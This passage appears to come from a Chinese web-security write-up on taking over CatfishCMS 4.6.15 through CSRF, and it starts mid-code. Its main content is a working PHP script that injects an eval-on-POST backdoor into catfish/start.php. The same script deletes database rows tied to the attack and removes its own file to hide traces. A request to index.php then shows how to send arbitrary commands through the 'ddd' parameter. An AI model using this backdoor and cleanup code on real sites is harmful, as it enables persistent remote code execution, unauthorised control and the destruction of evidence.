&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">});</span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image6.png" width="560" height="341" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image7.png" width="560" height="310" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">写好以后模拟管理员，进入后台</span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image8.png" width="560" height="250" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image9.png" width="560" height="234" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image10.png" width="560" height="308" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image11.png" width="560" height="383" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">getshell_code</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$start_content = file_get_contents(&#39;catfish/start.php&#39;).&#39;eval(@$_POST[ddd]);&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$start = fopen(&#39;catfish/start.php&#39;, &#39;w&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fwrite($start, $start_content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if( @$_GET[zzz]){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config = require_once(&quot;application/database.php&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">分别对应的是</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">地址，端口号，连接的数据库，编码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$dsn = &quot;mysql:host={$config[&#39;hostname&#39;]}; port={$config[&#39;hostport&#39;]}; dbname={$config[&#39;database&#39;]}; charset={$config[&#39;charset&#39;]}&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$user = $config[&#39;username&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$psw = $config[&#39;password&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pdo = new PDO($dsn,$user,$psw);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql = &quot;DELETE from catfish_posts WHERE post_title LIKE &#39;%xss_csrf_getshll%&#39;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql_1 = &quot;DELETE from catfish_comments WHERE content LIKE &#39;%xss_csrf_getshll%&#39;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pdo-&gt;query($sql);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pdo-&gt;query($sql_1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink(&#39;getshell_code.php&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image12.png" width="560" height="206" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">连接马子的操作，这个文件会在</span><span class="cs8926E06">index.php</span><span class="cs9C1B1871">中给引入所以直接</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/index.php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">POST</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">ddd = </span><span class="cs7FFD2630">你要执行的命令</span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image13.png" width="560" height="217" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image14.png" width="560" height="251" alt="" style="border-width:0px;" /></span></p></body>
</html>
